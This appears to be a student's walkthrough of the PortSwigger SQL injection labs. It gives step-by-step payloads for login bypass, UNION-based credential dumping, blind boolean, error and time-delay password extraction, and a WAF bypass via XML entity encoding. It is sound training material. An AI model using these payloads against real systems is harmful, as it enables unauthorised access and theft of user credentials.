## LAB - 1
**lab link: <https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data>**

 **Topic :-** 

- SQL injection vulnerability in WHERE clause allowing retrieval of hidden data.

 **To Solve :-**

- Perform a SQL injection attack that causes the application to display one or more unreleased products.

 **Procedure :-**

1. Click on any category. then notice that a filter is applied in url.
2. Try to fuzz the category filter.
3. Try ` category=' ` , it show the internal error, means there's an SQl vuln.
4. Try ` category='-- `, it show neither any error nor anything as it process as null category.
5. Then try ` category=' or 1=1 -- `, it will solve the lab as the `1=1` cond is always true.


## LAB - 2
**lab link: <https://portswigger.net/web-security/sql-injection/lab-login-bypass>**

 **Topic :-** 

- SQL injection vulnerability allowing login bypass.

 **To Solve :-**

- Perform a SQL injection attack that logs in to the application as the `administrator` user.

 **Procedure :-**

1. open login page, try random cred , it shows "invalid username or password"
2. try `'` in any of the input and fill other with random cred, it will show  internal server error, means it contain SQLi vuln.
3. try ` administrator'-- ` in username and random in password and voila.


## LAB - 3
**lab link: <https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns>**

 **Topic :-** 

- SQL injection UNION attack, determining the number of columns returned by the query.

 **To Solve :-**

- Determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

 **Procedure :-**

1. open the lab  and apply any filter.
2. try `'` at the end of url,it shows an internal error which means that the site is SQLi vuln.
3. then try ` ' UNION SELECT NULL -- `, it still shows internal error.
4. try again with ` ' UNION SELECT NULL, NULL -- `, it still shows internal error.
5. again, with ` ' UNION SELECT NULL, NULL, NULL -- `, and voila. it means that there are 3 columns.


## LAB - 4
**lab link: <https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text>**

 **Topic :-** 

- SQL injection UNION attack, finding a column containing text.


 **To Solve :-**

- Perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

 **Procedure :-**

1. first find the number of columns using ` ' UNION SELECT NULL, NULL, NULL -- `.
2. after finding there are 3 columns, substitute each `NULL` with a string type like `a` to find text type column.
3. try ` ' UNION SELECT 'a', NULL, NULL -- ` ,it shows an internal error as it is id column.
4. try ` ' UNION SELECT NULL, 'a', NULL-- `, it shows that 2nd column is of text type.
5. then try ` ' UNION SELECT NULL, 'a', 'a' -- `, it shows an internal error means that only 2nd column is of text type.
6. then to solve put 'zTN76t' the given string in place of 'a'. and voila.


## LAB - 5
**lab link: <https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables>**

 **Topic :-** 

- SQL injection UNION attack, retrieving data from other tables.

 **To Solve :-**

- Perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

 **Procedure :-**

1. Determine the number of columns using ` ' UNION SELECT NULL, NULL -- `. it contain 2 columns.
2. Determine which columns are of text type using ` ' UNION SELECT 'a' , 'a' -- `, both are of text type.
3. Then try ` ' UNION SELECT username, password from users -- `, it will show all username and password . then copy paste the administrator credential in login page and voila.


## LAB - 6
**lab link: <https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column>**

 **Topic :-** 

- SQL injection UNION attack, retrieving multiple values in a single column.


 **To Solve :-**

- perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

 **Procedure :-**

1. Determine the number of column using ` ' UNION SELECT NULL, NULL -- ` ,mean it contain only 2 columns.
2. Determine which column is of text type using ` ' UNION SELECT NULL, 'a' -- `, means only 2nd column is of text type.
3. For having both username and password in same column, it have to be concatenated, and its version is to be known for concatenating syntax.
4. Try using ` ' UNION SELECT NULL, version() -- `, it shows that the SQL is of postgreSQL .
5. Now the version is know , try ` ' UNION SELECT NULL, username || ' = ' || password from users -- `, it shows the cred of all users. use administrator credential in login page and Voila.


## LAB - 7
**lab link: <https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle>**

 **Topic :-** 

- SQL injection attack, querying the database type and version on Oracle.


 **To Solve :-**

- Display the database version string.

 **Procedure :-**

1. Check for SQLi vuln by adding `'`  at end of category filter .
2. Determine the number of columns using ` ' Union Select NULL, NULL -- `, but it causes internal server , as per the quotient its oracle , it means `SELECT ` statement should contain `FROM` clause. And there is a `DUAL` table which can be use for such purpose accessible by everyone.
3. Try ` ' UNION SELECT NULL, NULL FROM DUAL -- `, it shows it contain  2 columns.
4. Determine which column is of text type using ` ' UNION SELECT 'a', 'a' FROM DUAL -- `, means both columns are of text type.
5. Then try ` ' UNION SELECT banner, NULL FROM v$version -- ` and Voila. It shows the database type and version.


## LAB - 8
**lab link: <https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft>**

 **Topic :-** 

- SQL injection attack, querying the database type and version on MySQL and Microsoft.


 **To Solve :-**

- Display the database version string.

 **Procedure :-**

1.  Determine the number of columns using ` ' UNION SELECT NULL, NULL --%20`, it shows that the database  contain 2 columns.
2. Determine which column is of text type using ` ' UNION SELECT 'a' , 'a' --%20` shows both the columns are of text type.
3. `--%20` is used as it is syntax for comment in MySQL, so for version checking try ` ' UNION SELECT @@version , NULL --%20` and Voila.


## LAB - 9
**lab link: <https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle>**

 **Topic :-** 

- SQL injection attack, listing the database contents on non-Oracle databases.


 **To Solve :-**

- Log in as the `administrator` user.

 **Procedure :-**

1. Determine the number of columns using ` ' UNION SELECT NULL, NULL --`, it shows that it contain 2 columns.
2. Determine which column is of text type using ` ' UNION SELECT 'a' , 'a' --`, it shows both column is of text type.
3. Now check which database it is running on using ` ' UNION SELECT version(), NULL --`, which shows it is running `PostgreSQL 12.20`.
4. Now find the table names using ` ' UNION SELECT table_name , NULL from information_schema.tables --`, it shows there is a "users_nzycfv" table.
5. Now to find the column names using ` ' UNION SELECT column_name , NULL FROM information_schema.columns WHERE table_name='users_nzycfv' -- ` it shows there are "password_zbptgp" and "username_qsmwjy" columns for usernames and passwords.
6. Now try ` ' UNION SELECT username_qsmwjy , password_zbptgp FROM users_nzycfv -- ` it returns with all usernmae and passwords including administrator's. then login with admin credential.


## LAB - 10
**lab link: <https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle>**

 **Topic :-** 

- SQL injection attack, listing the database contents on Oracle.


 **To Solve :-**

- Log in as the `administrator` user.

 **Procedure :-**

1.  Determine the number of columns using ` ' UNION SELECT NULL, NULL FROM DUAL--`, it shows that it contain 2 columns.
2. Determine which column is of text type using ` ' UNION SELECT 'a' , 'a' FROM Dual--`, it shows both column is of text type.
3. Now check which database it is running on using ` ' UNION SELECT banner , NULL FROM v$version--`, which shows it is running `Oracle Database 11g`.
4. now find the table names using ` ' UNION SELECT table_name , NULL from all_tables --`, it shows there is a "USERS_WUTOXD" table.
5. Now to find the column names using ` ' UNION SELECT column_name , NULL FROM all_tab_columns WHERE table_name='USERS_WUTOXD' -- ` it shows there are "PASSWORD_XQDQHQ" and "USERNAME_ZFNIHX" columns for usernames and passwords.
6. Now try ` ' UNION SELECT USERNAME_ZFNIHX , PASSWORD_XQDQHQ FROM USERS_WUTOXD -- ` it returns with all username and passwords including administrator's. then login with admin credential.


## LAB - 11
**lab link: <https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses>**

 **Topic :-** 

- Blind SQL injection with conditional responses.


 **To Solve :-**

- Log in as the `administrator` user.

 **Procedure :-**

1. Open the page in burp suite , and send any page containing "track id" to repeater.
2. Send the request with as it is track id, you will get "welcome back" in response. but if you change the id even a little, it will not return a "welcome back" in response.
3. Try with true cond with track id like ` ' and 1=1 --`, it will return "welcome back" in response . but if with false cond like ` ' and 0=1 --`, it will not return with "welcome back" response.
4. Now finding the table named "users" using ` ' and ( SELECT 'x' FROM users LIMIT 1)='x' --`, it return with "Welcome back" msg , means the database contain the "users" table.
5. Now if the admin is in users table or not, ` ' and ( SELECT username FROM users where username='administrator')='administrator' --`.
6. Now to find the length of admin password using ` ' and ( SELECT username from users where username='administrator' and LENGTH(password)>1)='administrator'--`, iterate it untill the length is found using intruder. at "20" the length of response changes means that the "welcome back" msg didnt return, meaning that length of password is "20".
7. Now to find the password after iterating the every single char of password, ` ' and (select substr(password,1,1) from users where username='administrator')='a' -- ` use intruder or zap's fuzzer, and iterate `1` and `a`, and you can find the password after putting together the chars.
8. Then login with admin credential.


## LAB - 12
**lab link: <https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors>**

 **Topic :-** 

- Blind SQL injection with conditional errors.

 **To Solve :-**

- Log in as the `administrator` user.

 **Procedure :-**

1. Open any page in zap with "track id" .
2. Try using `'` after track id, it will cause an internal error .but if `''` is used , it will not cause any error.
3. Now checking if there is vuln using ` ' || ( select '' from dual ) || ' `, it will not cause any error.
4. Now check if there is users table using ` ' || (select '' from users where rownum=1) || ' `, it will not cause any error means it has users table.
5. Now check if there is an admin or not using ` ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' ) || ' ` which causes an error , means admin exist . if we change username it will not causes an error means that username does not exist.
6. Now to find the password length, ` ' || (SELECT CASE when (1=1) then TO_CHAR(1/0) else '' END FROM users where username='administrator' and LENGTH(password)>1) || ' `, iterate it untill until you find the length of password using fuzzer. it shows that it return error till 20 means the length of password is 20.
7. Now we have to find whole password by iterating each char, ` ' || ( select case when (1=1) then TO_CHAR(1/0) else '' end from users where username='administrator' and substr(password,1,1)='a') || '`, using the fuzzer, the correct ones are the one which causing the errors.
8. Then login with the admin credential.


## LAB - 13
**lab link: <https://portswigger.net/web-security/sql-injection/blind/lab-time-delays>**

 **Topic :-** 

- Blind SQL injection with time delays.

 **To Solve :-**

- Exploit the SQL injection vulnerability to cause a 10 second delay.

 **Procedure :-**

1. Open any page with track id in zap.
2. If the db type is unknown use different type of sleep function in each database, start with ` ' || (select sleep(10)) || --`, it failed, it measn its not MySQL.
3. Then use ` ' || (select pg_sleep(10)) || --` it worked it means its a postgresql.


## LAB - 14
**lab link: <https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval>**

 **Topic :-** 

- Blind SQL injection with time delays and information retrieval.

 **To Solve :-**

- Log in as the `administrator` user.

 **Procedure :-**

1. Open any page with track id in zap.
2. check the time delay by adding  ` ' || pg_sleep(10) -- ` after track id number.
3. Check if the users exist using ` ' || ( select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)-- `, there is time delay means users table exist.
4. Find the length of password using ` ' || ( select case when (username='administrator' and LENGTH(password)>1) then pg_sleep(10) else pg_sleep(-1) end from users) --`, iterate untill less then rtt appear which is at 20 means length of password is 20.
5. Now to find the whole password by iterating each char using ` ' || ( select case when (username='administrator' and substr(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users) --`, the ones with over 10 sec rtt are the part of password.
6. Then login with admin credential.


## LAB - 14
**lab link: <https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding>**

 **Topic :-** 

- SQL injection with filter bypass via XML encoding.

 **To Solve :-**

- Perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.

 **Procedure :-**

1. Map the site with Burp-suite.
2. Open the "POST /product/stock" in repeater, there is xml input add `UNION SELECT NULL` after 1, here the attack is detected.
3. Then use heckvertor to encode to hex_entities to bypass firewall.(build in, burpsuite extension) and now it can be bypass.
4. ` UNION SELECT NULL` also ahow that it contain only 1 column , and we need username and password.
5. Try ` UNION SELECT username || ' - ' || password from users ` and the admin cred can be seen. and login with admin credential.


## LAB - 15
**lab link: <https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based>**

 **Topic :-** 

- Visible error-based SQL injection..

 **To Solve :-**

- Find a way to leak the password for the `administrator` user, then log in to their account.

 **Procedure :-**

1. Open the site in burp suite. send `GET /product?productID=9` into repeater as it interact with backend.
2. Check for SQLi Vuln using `'` after trackid, and it will give an verbose error, which can be visible.
3. Now try ` ' -- `, now there is no error.
4. Now try ` ' AND CAST ((SELECT 1) as int) -- `, the visible error return that it should be of boolean type , not int.
5. Now try ` ' AND 1=CAST((SELECT 1) as int)--`, now there is no error.
6. Try ` ' AND 1=cast((select username from users) as int)-- `, the visible error suggest there are only certain number of char available for track id, So remove the track id number and try again. the visible error return that it should return only one value.
7. Try ` ' AND 1=cast((select username from users limit 1) as int) --`, the visible error return the username "administrator"
8. Now ` ' AND 1=cast((select password from users limit 1) as int) --`, the visible error will return the password of admin.
9. Now login with admin credential.